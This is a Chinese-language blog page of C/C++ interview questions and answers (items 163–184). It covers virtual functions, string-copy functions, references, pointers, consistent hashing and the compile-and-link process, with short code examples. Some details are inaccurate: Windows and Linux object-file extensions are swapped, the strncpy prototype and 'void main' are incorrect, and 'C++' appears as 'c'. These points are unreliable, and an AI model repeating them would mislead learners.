title="163、一个类中的全部构造函数的扩展过程是什么？"></a>163、一个类中的全部构造函数的扩展过程是什么？</h4><p>1)  记录在成员初始化列表中的数据成员初始化操作会被放在构造函数的函数体内，并与成员的声明顺序为顺序；</p><p>2)  如果一个成员并没有出现在成员初始化列表中，但它有一个默认构造函数，那么默认构造函数必须被调用；</p><p>3)  如果class有虚表，那么它必须被设定初值；</p><p>4)  所有上一层的基类构造函数必须被调用；</p><p>5)  所有虚基类的构造函数必须被调用。</p><h4 id="164、哪些函数不能是虚函数？把你知道的都说一说"><a href="#164、哪些函数不能是虚函数？把你知道的都说一说" class="headerlink" title="164、哪些函数不能是虚函数？把你知道的都说一说"></a>164、哪些函数不能是虚函数？把你知道的都说一说</h4><p>1)  构造函数，构造函数初始化对象，派生类必须知道基类函数干了什么，才能进行构造；当有虚函数时，每一个类有一个虚表，每一个对象有一个虚表指针，虚表指针在构造函数中初始化；</p><p>2)  内联函数，内联函数表示在编译阶段进行函数体的替换操作，而虚函数意味着在运行期间进行类型确定，所以内联函数不能是虚函数；</p><p>3)  静态函数，静态函数不属于对象属于类，静态成员函数没有this指针，因此静态函数设置为虚函数没有任何意义。</p><p>4)  友元函数，友元函数不属于类的成员函数，不能被继承。对于没有继承特性的函数没有虚函数的说法。</p><p>5)  普通函数，普通函数不属于类的成员函数，不具有继承特性，因此普通函数没有虚函数。</p><h4 id="165、说一说strcpy、sprintf与memcpy这三个函数的不同之处"><a href="#165、说一说strcpy、sprintf与memcpy这三个函数的不同之处" class="headerlink" title="165、说一说strcpy、sprintf与memcpy这三个函数的不同之处"></a>165、说一说strcpy、sprintf与memcpy这三个函数的不同之处</h4><p>1)  操作对象不同</p><p>①   strcpy的两个操作对象均为字符串 </p><p>②   sprintf的操作源对象可以是多种数据类型，目的操作对象是字符串 </p><p>③   memcpy的两个对象就是两个任意可操作的内存地址，并不限于何种数据类型。</p><p>2)  执行效率不同</p><p>memcpy最高，strcpy次之，sprintf的效率最低。</p><p>3)  实现功能不同</p><p>①   strcpy主要实现字符串变量间的拷贝 </p><p>②   sprintf主要实现其他数据类型格式到字符串的转化 </p><p>③   memcpy主要是内存块间的拷贝。</p><h4 id="166、将引用作为函数参数有哪些好处？"><a href="#166、将引用作为函数参数有哪些好处？" class="headerlink" title="166、将引用作为函数参数有哪些好处？"></a>166、将引用作为函数参数有哪些好处？</h4><p>1)  传递引用给函数与传递指针的效果是一样的。</p><p>这时，被调函数的形参就成为原来主调函数中的实参变量或对象的一个别名来使用，所以在被调函数中对形参变量的操作就是对其相应的目标对象（在主调函数中）的操作。</p><p>2)  使用引用传递函数的参数，在内存中并没有产生实参的副本，它是直接对实参操作；</p><p>而使用一般变量传递函数的参数，当发生函数调用时，需要给形参分配存储单元，形参变量是实参变量的副本；</p><p>如果传递的是对象，还将调用拷贝构造函数。因此，当参数传递的数据较大时，用引用比用一般变量传递参数的效率和所占空间都好。</p><p>3)  使用指针作为函数的参数虽然也能达到与使用引用的效果，但是，在被调函数中同样要给形参分配存储单元，且需要重复使用”*指针变量名”的形式进行运算，这很容易产生错误且程序的阅读性较差；</p><p>另一方面，在主调函数的调用点处，必须用变量的地址作为实参。而引用更容易使用，更清晰。</p><h4 id="167、你知道数组和指针的区别吗？"><a href="#167、你知道数组和指针的区别吗？" class="headerlink" title="167、你知道数组和指针的区别吗？"></a>167、你知道数组和指针的区别吗？</h4><p>1)  数组在内存中是连续存放的，开辟一块连续的内存空间；数组所占存储空间：sizeof（数组名）；数组大小：sizeof(数组名)/sizeof(数组元素数据类型)；</p><p>2)  用运算符sizeof 可以计算出数组的容量（字节数）。sizeof(p),p 为指针得到的是一个指针变量的字节数，而不是p 所指的内存容量。</p><p>3)  编译器为了简化对数组的支持，实际上是利用指针实现了对数组的支持。具体来说，就是将表达式中的数组元素引用转换为指针加偏移量的引用。</p><p>4)  在向函数传递参数的时候，如果实参是一个数组，那用于接受的形参为对应的指针。也就是传递过去是数组的首地址而不是整个数组，能够提高效率；</p><p>5)  在使用下标的时候，两者的用法相同，都是原地址加上下标值，不过数组的原地址就是数组首元素的地址是固定的，指针的原地址就不是固定的。</p><h4 id="168、如何阻止一个类被实例化？有哪些方法？"><a href="#168、如何阻止一个类被实例化？有哪些方法？" class="headerlink" title="168、如何阻止一个类被实例化？有哪些方法？"></a>168、如何阻止一个类被实例化？有哪些方法？</h4><p>1)  将类定义为抽象基类或者将构造函数声明为private；</p><p>2)  不允许类外部创建类对象，只能在类内部创建对象</p><h4 id="169、-如何禁止程序自动生成拷贝构造函数？"><a href="#169、-如何禁止程序自动生成拷贝构造函数？" class="headerlink" title="169、 如何禁止程序自动生成拷贝构造函数？"></a>169、 如何禁止程序自动生成拷贝构造函数？</h4><p>1)  为了阻止编译器默认生成拷贝构造函数和拷贝赋值函数，我们需要手动去重写这两个函数，某些情况﻿下，为了避免调用拷贝构造函数和﻿拷贝赋值函数，我们需要将他们设置成private，防止被调用。</p><p>2)  类的成员函数和friend函数还是可以调用private函数，如果这个private函数只声明不定义，则会产生一个连接错误；</p><p>3)  针对上述两种情况，我们可以定一个base类，在base类中将拷贝构造函数和拷贝赋值函数设置成private,那么派生类中编译器将不会自动生成这两个函数，且由于base类中该函数是私有的，因此，派生类将阻止编译器执行相关的操作。</p><h4 id="170、你知道Denug和release的区别是什么吗？"><a href="#170、你知道Denug和release的区别是什么吗？" class="headerlink" title="170、你知道Denug和release的区别是什么吗？"></a>170、你知道Denug和release的区别是什么吗？</h4><p>1)  调试版本，包含调试信息，所以容量比Release大很多，并且不进行任何优化（优化会使调试复杂化，因为源代码和生成的指令间关系会更复杂），便于程序员调试。Debug模式下生成两个文件，除了.exe或.dll文件外，还有一个.pdb文件，该文件记录了代码中断点等调试信息； </p><p>2)  发布版本，不对源代码进行调试，编译时对应用程序的速度进行优化，使得程序在代码大小和运行速度上都是最优的。（调试信息可在单独的PDB文件中生成）。Release模式下生成一个文件.exe或.dll文件。</p><p>3)  实际上，Debug 和 Release 并没有本质的界限，他们只是一组编译选项的集合，编译器只是按照预定的选项行动。事实上，我们甚至可以修改这些选项，从而得到优化过的调试版本或是带跟踪语句的发布版本。</p><h4 id="171、main函数的返回值有什么值得考究之处吗？"><a href="#171、main函数的返回值有什么值得考究之处吗？" class="headerlink" title="171、main函数的返回值有什么值得考究之处吗？"></a>171、main函数的返回值有什么值得考究之处吗？</h4><p>程序运行过程入口点main函数，main（）函数返回值类型必须是int，这样返回值才能传递给程序激活者（如操作系统）表示程序正常退出。</p><p>main（int args, char **argv） 参数的传递。参数的处理，一般会调用getopt（）函数处理，但实践中，这仅仅是一部分，不会经常用到的技能点。</p><h4 id="172、模板会写吗？写一个比较大小的模板函数"><a href="#172、模板会写吗？写一个比较大小的模板函数" class="headerlink" title="172、模板会写吗？写一个比较大小的模板函数"></a>172、模板会写吗？写一个比较大小的模板函数</h4><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;iostream></span> </span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span> <span class="token keyword">template</span><span class="token operator">&lt;</span><span class="token keyword">typename</span> <span class="token class-name">type1</span><span class="token punctuation">,</span><span class="token keyword">typename</span> <span class="token class-name">type2</span><span class="token operator">></span><span class="token comment">//函数模板 </span>type1 <span class="token function">Max</span><span class="token punctuation">(</span>type1 a<span class="token punctuation">,</span>type2 b<span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> a <span class="token operator">></span> b <span class="token operator">?</span> a <span class="token operator">:</span> b<span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>   cout<span class="token operator">&lt;&lt;</span><span class="token string">"Max = "</span><span class="token operator">&lt;&lt;</span><span class="token function">Max</span><span class="token punctuation">(</span><span class="token number">5.5</span><span class="token punctuation">,</span><span class="token char">'a'</span><span class="token punctuation">)</span><span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> </code></pre><h4 id="173、智能指针出现循环引用怎么解决？"><a href="#173、智能指针出现循环引用怎么解决？" class="headerlink" title="173、智能指针出现循环引用怎么解决？"></a>173、智能指针出现循环引用怎么解决？</h4><p>弱指针用于专门解决shared_ptr循环引用的问题，weak_ptr不会修改引用计数，即其存在与否并不影响对象的引用计数器。循环引用就是：两个对象互相使用一个shared_ptr成员变量指向对方。弱引用并不对对象的内存进行管理，在功能上类似于普通指针，然而一个比较大的区别是，弱引用能检测到所管理的对象是否已经被释放，从而避免访问非法内存。</p><h4 id="174、strcpy函数和strncpy函数的区别？哪个函数更安全？"><a href="#174、strcpy函数和strncpy函数的区别？哪个函数更安全？" class="headerlink" title="174、strcpy函数和strncpy函数的区别？哪个函数更安全？"></a>174、strcpy函数和strncpy函数的区别？哪个函数更安全？</h4><p>1)  函数原型</p><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">char</span><span class="token operator">*</span> <span class="token function">strcpy</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span> strDest<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> strSrc<span class="token punctuation">)</span><span class="token keyword">char</span><span class="token operator">*</span> <span class="token function">strncpy</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span> strDest<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> strSrc<span class="token punctuation">,</span> <span class="token keyword">int</span> pos<span class="token punctuation">)</span></code></pre><p>2)  strcpy函数: 如果参数 dest 所指的内存空间不够大，可能会造成缓冲溢出(buffer Overflow)的错误情况，在编写程序时请特别留意，或者用strncpy()来取代。<br> strncpy函数：用来复制源字符串的前n个字符，src 和 dest 所指的内存区域不能重叠，且 dest 必须有足够的空间放置n个字符。 </p><p>3)  如果目标长&gt;指定长&gt;源长，则将源长全部拷贝到目标长，自动加上’\0’<br> 如果指定长&lt;源长，则将源长中按指定长度拷贝到目标字符串，不包括’\0’<br> 如果指定长&gt;目标长，运行时错误 ；</p><h4 id="175、static-cast比C语言中的转换强在哪里？"><a href="#175、static-cast比C语言中的转换强在哪里？" class="headerlink" title="175、static_cast比C语言中的转换强在哪里？"></a>175、static_cast比C语言中的转换强在哪里？</h4><p>1)  更加安全；</p><p>2)  更直接明显，能够一眼看出是什么类型转换为什么类型，容易找出程序中的错误；可清楚地辨别代码中每个显式的强制转；可读性更好，能体现程序员的意图</p><h4 id="176、成员函数里memset-this-0-sizeof-this-会发生什么"><a href="#176、成员函数里memset-this-0-sizeof-this-会发生什么" class="headerlink" title="176、成员函数里memset(this,0,sizeof(*this))会发生什么"></a>176、成员函数里memset(this,0,sizeof(*this))会发生什么</h4><p>1)  有时候类里面定义了很多int,char,struct等c语言里的那些类型的变量，我习惯在构造函数中将它们初始化为0，但是一句句的写太麻烦，所以直接就memset(this, 0, sizeof *this);将整个对象的内存全部置为0。对于这种情形可以很好的工作，但是下面几种情形是不可以这么使用的；</p><p>2)  类含有虚函数表：这么做会破坏虚函数表，后续对虚函数的调用都将出现异常；</p><p>3)  类中含有c类型的对象：例如，类中定义了一个list的对象，由于在构造函数体的代码执行之前就对list对象完成了初始化，假设list在它的构造函数里分配了内存，那么我们这么一做就破坏了list对象的内存。</p><h4 id="177、你知道回调函数吗？它的作用？"><a href="#177、你知道回调函数吗？它的作用？" class="headerlink" title="177、你知道回调函数吗？它的作用？"></a>177、你知道回调函数吗？它的作用？</h4><p>1)  当发生某种事件时，系统或其他函数将会自动调用你定义的一段函数；</p><p>2)  回调函数就相当于一个中断处理函数，由系统在符合你设定的条件时自动调用。为此，你需要做三件事：1，声明；2，定义；3，设置触发条件，就是在你的函数中把你的回调函数名称转化为地址作为一个参数，以便于系统调用；</p><p>3)  回调函数就是一个通过函数指针调用的函数。如果你把函数的指针（地址）作为参数传递给另一个函数，当这个指针被用为调用它所指向的函数时，我们就说这是回调函数；</p><p>4)  因为可以把调用者与被调用者分开。调用者不关心谁是被调用者，所有它需知道的，只是存在一个具有某种特定原型、某些限制条件（如返回值为int）的被调用函数。</p><h4 id="178、什么是一致性哈希？"><a href="#178、什么是一致性哈希？" class="headerlink" title="178、什么是一致性哈希？"></a>178、什么是一致性哈希？</h4><p><strong>一致性哈希</strong></p><p>一致性哈希是一种哈希算法，就是<strong>在移除或者增加一个结点时，能够尽可能小的改变已存在key的映射关系</strong></p><p>尽可能少的改变已有的映射关系，一般是沿着顺时针进行操作，回答之前可以先想想，真实情况如何处理</p><p>一致性哈希将整个哈希值空间组<strong>织成一个虚拟的圆环</strong>，假设哈希函数的值空间为0~2^32-1，整个哈希空间环如下左图所示</p><p><img src="https://cdn.jsdelivr.net/gh/forthespada/mediaImage1@1.6.3.8/202102//1566573802731.png" alt=""></p><p>一致性hash的基本思想就是使用相同的hash算法将数据和结点都映射到图中的环形哈希空间中，上右图显示了4个数据object1-object4在环上的分布图</p><p><strong>结点和数据映射</strong></p><p>假如有一批服务器，可以根据IP或者主机名作为关键字进行哈希，根据结果映射到哈希环中，3台服务器分别是nodeA-nodeC</p><p>现在有一批的数据object1-object4需要存在服务器上，则可以使用相同的哈希算法对数据进行哈希，其结果必然也在环上，可以沿着顺时针方向寻找，找到一个结点（服务器）则将数据存在这个结点上，这样数据和结点就产生了一对一的关联，如下图所示：</p><p><img src="https://cdn.jsdelivr.net/gh/forthespada/mediaImage1@1.6.3.8/202102/1566573868429.png" alt=""></p><p><strong>移除结点</strong></p><p>如果一台服务器出现问题，如上图中的nodeB，则受影响的是其逆时针方向至下一个结点之间的数据，只需将这些数据映射到它顺时针方向的第一个结点上即可，下左图</p><p><img src="https://cdn.jsdelivr.net/gh/forthespada/mediaImage1@1.6.3.8/202102/1566573901641.png" alt=""></p><p><strong>添加结点</strong></p><p>如果新增一台服务器nodeD，受影响的是其逆时针方向至下一个结点之间的数据，将这些数据映射到nodeD上即可，见上右图</p><p><strong>虚拟结点</strong></p><p>假设仅有2台服务器：nodeA和nodeC，nodeA映射了1条数据，nodeC映射了3条，这样数据分布是不平衡的。引入虚拟结点，假设结点复制个数为2，则nodeA变成：nodeA1和nodeA2，nodeC变成：nodeC1和nodeC2，映射情况变成如下：</p><p><img src="https://cdn.jsdelivr.net/gh/forthespada/mediaImage1@1.6.3.8/202102/1566573927297.png" alt=""></p><p>这样数据分布就均衡多了，平衡性有了很大的提高</p><blockquote><p>《程序员求职宝典》王道论坛</p></blockquote><h4 id="179、什么是纯虚函数，与虚函数的区别"><a href="#179、什么是纯虚函数，与虚函数的区别" class="headerlink" title="179、什么是纯虚函数，与虚函数的区别"></a>179、什么是纯虚函数，与虚函数的区别</h4><p><strong>虚函数和纯虚函数区别</strong>？</p><ul><li><p>虚函数是为了实现动态编联产生的，目的是通过基类类型的指针指向不同对象时，自动调用相应的、和基类同名的函数（使用同一种调用形式，既能调用派生类又能调用基类的同名函数）。虚函数需要在基类中加上virtual修饰符修饰，因为virtual会被隐式继承，所以子类中相同函数都是虚函数。当一个成员函数被声明为虚函数之后，其派生类中同名函数自动成为虚函数，在派生类中重新定义此函数时要求函数名、返回值类型、参数个数和类型全部与基类函数相同。</p></li><li><p>纯虚函数只是相当于一个接口名，但含有纯虚函数的类不能够实例化。</p></li></ul><p>纯虚函数首先是虚函数，其次它没有函数体，取而代之的是用“=0”。</p><p>既然是虚函数，它的函数指针会被存在虚函数表中，由于纯虚函数并没有具体的函数体，因此它在虚函数表中的值就为0，而具有函数体的虚函数则是函数的具体地址。</p><p>一个类中如果有纯虚函数的话，称其为抽象类。抽象类不能用于实例化对象，否则会报错。抽象类一般用于定义一些公有的方法。子类继承抽象类也必须实现其中的纯虚函数才能实例化对象。</p><p>举个例子：</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span></span>using namespace std<span class="token punctuation">;</span>class Base<span class="token punctuation">&#123;</span>public<span class="token operator">:</span>virtual <span class="token keyword">void</span> <span class="token function">fun1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"普通虚函数"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span><span class="token punctuation">&#125;</span>virtual <span class="token keyword">void</span> <span class="token function">fun2</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>virtual <span class="token operator">~</span><span class="token function">Base</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>class Son <span class="token operator">:</span> public Base<span class="token punctuation">&#123;</span>public<span class="token operator">:</span>virtual <span class="token keyword">void</span> <span class="token function">fun2</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"子类实现的纯虚函数"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>Base<span class="token operator">*</span> b <span class="token operator">=</span> new Son<span class="token punctuation">;</span>b<span class="token operator">-></span><span class="token function">fun1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//普通虚函数</span>b<span class="token operator">-></span><span class="token function">fun2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//子类实现的纯虚函数</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h4 id="180、c从代码到可执行程序经历了什么？"><a href="#180、c从代码到可执行程序经历了什么？" class="headerlink" title="180、c从代码到可执行程序经历了什么？"></a>180、c从代码到可执行程序经历了什么？</h4><p><strong>（1）预编译</strong><br>主要处理源代码文件中的以“#”开头的预编译指令。处理规则见下：</p><ol><li><p>删除所有的#define，展开所有的宏定义。</p></li><li><p>处理所有的条件预编译指令，如“#if”、“#endif”、“#ifdef”、“#elif”和“#else”。</p></li><li>处理“#include”预编译指令，将文件内容替换到它的位置，这个过程是递归进行的，文件中包含其他<br>文件。</li><li>删除所有的注释，“//”和“/**/”。</li><li>保留所有的#pragma 编译器指令，编译器需要用到他们，如：#pragma once 是为了防止有文件被重<br>复引用。</li><li>添加行号和文件标识，便于编译时编译器产生调试用的行号信息，和编译时产生编译错误或警告是<br>能够显示行号。</li></ol><p><strong>（2）编译</strong><br>把预编译之后生成的xxx.i或xxx.ii文件，进行一系列词法分析、语法分析、语义分析及优化后，生成相应<br>的汇编代码文件。</p><ol><li>词法分析：利用类似于“有限状态机”的算法，将源代码程序输入到扫描机中，将其中的字符序列分<br>割成一系列的记号。</li><li>语法分析：语法分析器对由扫描器产生的记号，进行语法分析，产生语法树。由语法分析器输出的<br>语法树是一种以表达式为节点的树。</li><li>语义分析：语法分析器只是完成了对表达式语法层面的分析，语义分析器则对表达式是否有意义进<br>行判断，其分析的语义是静态语义——在编译期能分期的语义，相对应的动态语义是在运行期才能确定<br>的语义。</li><li>优化：源代码级别的一个优化过程。</li><li>目标代码生成：由代码生成器将中间代码转换成目标机器代码，生成一系列的代码序列——汇编语言<br>表示。</li><li>目标代码优化：目标代码优化器对上述的目标机器代码进行优化：寻找合适的寻址方式、使用位移<br>来替代乘法运算、删除多余的指令等。</li></ol><p><strong>（3）汇编</strong><br>将汇编代码转变成机器可以执行的指令(机器码文件)。 汇编器的汇编过程相对于编译器来说更简单，没<br>有复杂的语法，也没有语义，更不需要做指令优化，只是根据汇编指令和机器指令的对照表一一翻译过<br>来，汇编过程有汇编器as完成。经汇编之后，产生目标文件(与可执行文件格式几乎一样)xxx.o(Windows<br>下)、xxx.obj(Linux下)。</p><p><strong>（4）链接</strong></p><p>将不同的源文件产生的目标文件进行链接，从而形成一个可以执行的程序。链接分为静态链接和动态链<br>接：<br><strong>静态链接</strong><br>函数和数据被编译进一个二进制文件。在使用静态库的情况下，在编译链接可执行文件时，链接器从库<br>中复制这些函数和数据并把它们和应用程序的其它模块组合起来创建最终的可执行文件。</p><p>空间浪费：因为每个可执行程序中对所有需要的目标文件都要有一份副本，所以如果多个程序对同一个<br>目标文件都有依赖，会出现同一个目标文件都在内存存在多个副本；</p><p>更新困难：每当库函数的代码修改了，这个时候就需要重新进行编译链接形成可执行程序。</p><p>运行速度快：但是静态链接的优点就是，在可执行程序中已经具备了所有执行程序所需要的任何东西，<br>在执行的时候运行速度快。</p><p><strong>动态链接</strong><br>动态链接的基本思想是把程序按照模块拆分成各个相对独立部分，在程序运行时才将它们链接在一起形<br>成一个完整的程序，而不是像静态链接一样把所有程序模块都链接成一个单独的可执行文件。</p><p>共享库：就是即使需要每个程序都依赖同一个库，但是该库不会像静态链接那样在内存中存在多分，副<br>本，而是这多个程序在执行时共享同一份副本；</p><p>更新方便：更新时只需要替换原来的目标文件，而无需将所有的程序再重新链接一遍。当程序下一次运<br>行时，新版本的目标文件会被自动加载到内存并且链接起来，程序就完成了升级的目标。</p><p>性能损耗：因为把链接推迟到了程序运行时，所以每次执行程序都需要进行链接，所以性能会有一定损<br>失。</p><blockquote><p>《操作系统（三）》：<a href="https://www.nowcoder.com/tutorial/93/675fd4af3ab34b2db0ae650855aa52d5">https://www.nowcoder.com/tutorial/93/675fd4af3ab34b2db0ae650855aa52d5</a></p></blockquote><h4 id="181、为什么友元函数必须在类内部声明？"><a href="#181、为什么友元函数必须在类内部声明？" class="headerlink" title="181、为什么友元函数必须在类内部声明？"></a>181、为什么友元函数必须在类内部声明？</h4><p>因为编译器必须能够读取这个结构的声明以理解这个数据类型的大、行为等方面的所有规则。</p><p>有一条规则在任何关系中都很重要，那就是谁可以访问我的私有部分。</p><h4 id="182、用C语言实现c的继承"><a href="#182、用C语言实现c的继承" class="headerlink" title="182、用C语言实现c的继承"></a>182、用C语言实现c的继承</h4><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span><span class="token comment">//c中的继承与多态</span><span class="token keyword">struct</span> <span class="token class-name">A</span><span class="token punctuation">&#123;</span>  <span class="token keyword">virtual</span> <span class="token keyword">void</span> <span class="token function">fun</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment">//c中的多态:通过虚函数实现</span>  <span class="token punctuation">&#123;</span>    cout<span class="token operator">&lt;&lt;</span><span class="token string">"A:fun()"</span><span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">int</span> a<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token class-name">B</span><span class="token operator">:</span><span class="token base-clause"><span class="token keyword">public</span> <span class="token class-name">A</span>     <span class="token comment">//c中的继承:B类公有继承A类</span></span><span class="token punctuation">&#123;</span>  <span class="token keyword">virtual</span> <span class="token keyword">void</span> <span class="token function">fun</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment">//c中的多态:通过虚函数实现（子类的关键字virtual可加可不加）</span>  <span class="token punctuation">&#123;</span>   cout<span class="token operator">&lt;&lt;</span><span class="token string">"B:fun()"</span><span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">int</span> b<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token comment">//C语言模拟c的继承与多态</span><span class="token keyword">typedef</span> <span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span>FUN<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">//定义一个函数指针来实现对成员函数的继承</span><span class="token keyword">struct</span> <span class="token class-name">_A</span>    <span class="token comment">//父类</span><span class="token punctuation">&#123;</span>  FUN _fun<span class="token punctuation">;</span>  <span class="token comment">//由于C语言中结构体不能包含函数，故只能用函数指针在外面实现</span>  <span class="token keyword">int</span> _a<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token class-name">_B</span>     <span class="token comment">//子类</span><span class="token punctuation">&#123;</span>  _A _a_<span class="token punctuation">;</span>   <span class="token comment">//在子类中定义一个基类的对象即可实现对父类的继承</span>  <span class="token keyword">int</span> _b<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">_fA</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment">//父类的同名函数</span><span class="token punctuation">&#123;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"_A:_fun()\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">_fB</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment">//子类的同名函数</span><span class="token punctuation">&#123;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"_B:_fun()\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">Test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token comment">//测试c中的继承与多态</span>  A a<span class="token punctuation">;</span>  <span class="token comment">//定义一个父类对象a</span>  B b<span class="token punctuation">;</span>  <span class="token comment">//定义一个子类对象b</span>   A<span class="token operator">*</span> p1 <span class="token operator">=</span> <span class="token operator">&amp;</span>a<span class="token punctuation">;</span>  <span class="token comment">//定义一个父类指针指向父类的对象</span>  p1<span class="token operator">-></span><span class="token function">fun</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//调用父类的同名函数</span>  p1 <span class="token operator">=</span> <span class="token operator">&amp;</span>b<span class="token punctuation">;</span>   <span class="token comment">//让父类指针指向子类的对象</span>  p1<span class="token operator">-></span><span class="token function">fun</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//调用子类的同名函数</span>   <span class="token comment">//C语言模拟继承与多态的测试</span>  _A _a<span class="token punctuation">;</span>  <span class="token comment">//定义一个父类对象_a</span>  _B _b<span class="token punctuation">;</span>  <span class="token comment">//定义一个子类对象_b</span>  _a<span class="token punctuation">.</span>_fun <span class="token operator">=</span> _fA<span class="token punctuation">;</span>    <span class="token comment">//父类的对象调用父类的同名函数</span>  _b<span class="token punctuation">.</span>_a_<span class="token punctuation">.</span>_fun <span class="token operator">=</span> _fB<span class="token punctuation">;</span>  <span class="token comment">//子类的对象调用子类的同名函数</span>  _A<span class="token operator">*</span> p2 <span class="token operator">=</span> <span class="token operator">&amp;</span>_a<span class="token punctuation">;</span>  <span class="token comment">//定义一个父类指针指向父类的对象</span>  p2<span class="token operator">-></span><span class="token function">_fun</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">//调用父类的同名函数</span>  p2 <span class="token operator">=</span> <span class="token punctuation">(</span>_A<span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>_b<span class="token punctuation">;</span> <span class="token comment">//让父类指针指向子类的对象,由于类型不匹配所以要进行强转</span>  p2<span class="token operator">-></span><span class="token function">_fun</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">//调用子类的同名函数</span><span class="token punctuation">&#125;</span></code></pre><h4 id="183、动态编译与静态编译"><a href="#183、动态编译与静态编译" class="headerlink" title="183、动态编译与静态编译"></a>183、动态编译与静态编译</h4><p>1)  静态编译，编译器在编译可执行文件时，把需要用到的对应动态链接库中的部分提取出来，连接到可执行文件中去，使可执行文件在运行时不需要依赖于动态链接库；</p><p>2)  动态编译的可执行文件需要附带一个动态链接库，在执行时，需要调用其对应动态链接库的命令。所以其优点一方面是缩小了执行文件本身的体积，另一方面是加快了编译速度，节省了系统资源。缺点是哪怕是很简单的程序，只用到了链接库的一两条命令，也需要附带一个相对庞大的链接库；二是如果其他计算机上没有安装对应的运行库，则用动态编译的可执行文件就不能运行。</p><h4 id="184、hello-c-程序的编译过程"><a href="#184、hello-c-程序的编译过程" class="headerlink" title="184、hello.c 程序的编译过程"></a>184、hello.c 程序的编译过程</h4><p>以下是一个 hello.c 程序：</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"hello, world\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>在 Unix 系统上，由编译器把源文件转换为目标文件。</p><pre class="language-bash" data-language="bash"><code class="language-bash">gcc <span class="token parameter variable">-o</span> hello hello.c</code></pre><p>这个过程大致如下：</p><p><img 